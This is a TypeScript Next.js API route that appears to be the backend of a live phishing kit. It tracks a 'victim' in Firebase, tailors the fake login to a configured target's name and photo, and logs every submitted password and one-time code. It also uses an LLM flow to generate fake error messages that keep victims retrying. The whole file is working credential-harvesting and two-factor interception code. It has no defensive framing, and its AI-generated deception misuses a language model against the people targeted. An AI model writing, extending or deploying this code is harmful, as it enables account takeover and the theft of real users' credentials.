import { NextRequest, NextResponse } from 'next/server';
import { get, ref, set, update, push as firebasePush } from 'firebase/database';
import { db } from '@/lib/firebase';
import { initialState, AppState } from '@/lib/state';
import { simulateErrorWithLLM } from '@/ai/flows/simulate-error';

export const dynamic = 'force-dynamic';

async function getAppState(): Promise<AppState> {
  const configRef = ref(db, 'config');
  const victimRef = ref(db, 'victim');

  const [configSnapshot, victimSnapshot] = await Promise.all([
    get(configRef),
    get(victimRef)
  ]);

  const config = configSnapshot.exists() ? configSnapshot.val() : initialState.config;
  const victim = victimSnapshot.exists() ? victimSnapshot.val() : initialState.victim;

  const currentState = {
    config: { ...initialState.config, ...config },
    victim: { ...initialState.victim, ...victim }
  };

  if (!configSnapshot.exists()) {
    await set(ref(db, 'config'), currentState.config);
  }
   if (!victimSnapshot.exists()) {
    await set(ref(db, 'victim'), currentState.victim);
  }

  return currentState;
}


export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const view = searchParams.get('view');
    const appState = await getAppState();

    if (view === 'admin') {
      return NextResponse.json(appState);
    }

    if (view === 'victim') {
       if (appState.config.attackMode === 'manual' && appState.victim.currentPage === 'email') {
         const manualStartState = {
            ...appState.victim,
            currentPage: 'login' as const,
            email: appState.config.targetEmail,
            name: appState.config.targetName,
            profilePicture: appState.config.targetProfilePicture,
         };
         await update(ref(db, 'victim'), manualStartState);
         return NextResponse.json({
            ...manualStartState,
            redirectUrl: appState.config.redirectUrl,
         });
       }

      return NextResponse.json({
        currentPage: appState.victim.currentPage,
        email: appState.victim.email,
        name: appState.victim.name,
        profilePicture: appState.victim.profilePicture,
        errorMessage: appState.victim.errorMessage,
        redirectUrl: appState.config.redirectUrl,
      });
    }

    return NextResponse.json({ error: 'Invalid view' }, { status: 400 });
  } catch (error) {
    console.error("Error in GET /api/state:", error);
    const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred';
    return NextResponse.json({ error: 'Internal Server Error', details: errorMessage }, { status: 500 });
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const stateRef = ref(db, '/');

    switch (body.action) {
      case 'setConfig':
        await set(ref(db, 'config'), body.config);
        // Reset victim state when new config is set
        await set(ref(db, 'victim'), initialState.victim);
        return NextResponse.json({ success: true, message: 'Configuration updated' });

      case 'setVictimPage':
        await update(ref(db, 'victim'), { currentPage: body.page });
        return NextResponse.json({ success: true, message: `Victim page set to ${body.page}` });

      case 'submitEmail': {
        const configRef = ref(db, 'config');
        const configSnapshot = await get(configRef);
        const config = configSnapshot.exists() ? configSnapshot.val() : initialState.config;
        
        const victimUpdate: any = {
          email: body.email,
          currentPage: 'login',
        };

        if (config.targetEmail && body.email.toLowerCase() === config.targetEmail.toLowerCase()) {
          victimUpdate.name = config.targetName;
          victimUpdate.profilePicture = config.targetProfilePicture;
        } else {
          victimUpdate.name = body.email.split('@')[0];
          victimUpdate.profilePicture = '';
        }
        await update(ref(db, 'victim'), victimUpdate);
        return NextResponse.json({ success: true });
      }

      case 'submitPassword': {
        const appState = await getAppState();
        const victim = appState.victim;

        const newAttempts = (victim.attempts || 0) + 1;
        
        const passwordsRef = ref(db, 'victim/passwords');
        await firebasePush(passwordsRef, body.password);

        let victimUpdate: any = { attempts: newAttempts };

        if (appState.config.attackMode === 'auto') {
          victimUpdate.currentPage = 'redirect';
        } else {
           if (victim.currentPage === 'login') {
              victimUpdate.currentPage = 'password';
          } else if (victim.currentPage === 'password') {
              victimUpdate.currentPage = 'pwCatch';
          } else if (victim.currentPage === 'pwCatch') {
            if (newAttempts >= 2) {
              try {
                const { errorMessage } = await simulateErrorWithLLM({ attempts: newAttempts });
                victimUpdate.errorMessage = errorMessage;
                victimUpdate.currentPage = 'error';
              } catch (error) {
                console.error("AI simulation failed:", error);
                victimUpdate.errorMessage = "An unexpected error occurred. Please try again later.";
                victimUpdate.currentPage = 'error';
              }
            }
          }
        }
        await update(ref(db, 'victim'), victimUpdate);
        return NextResponse.json({ success: true });
      }
      
      case 'submitOtp':
        await update(ref(db, 'victim'), {
          otp: body.otp,
          currentPage: 'redirect'
        });
        return NextResponse.json({ success: true });

      case 'clearVictimData':
        await set(ref(db, 'victim'), initialState.victim);
        return NextResponse.json({ success: true, message: 'Victim data cleared' });

      case 'reset':
        await set(ref(db, 'config'), initialState.config);
        await set(ref(db, 'victim'), initialState.victim);
        return NextResponse.json({ success: true, message: 'State reset' });
        
      default:
        return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
    }
  } catch(error) {
    console.error("Error in POST /api/state:", error);
    const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred';
    return NextResponse.json({ error: 'Internal Server Error', details: errorMessage }, { status: 500 });
  }
}

    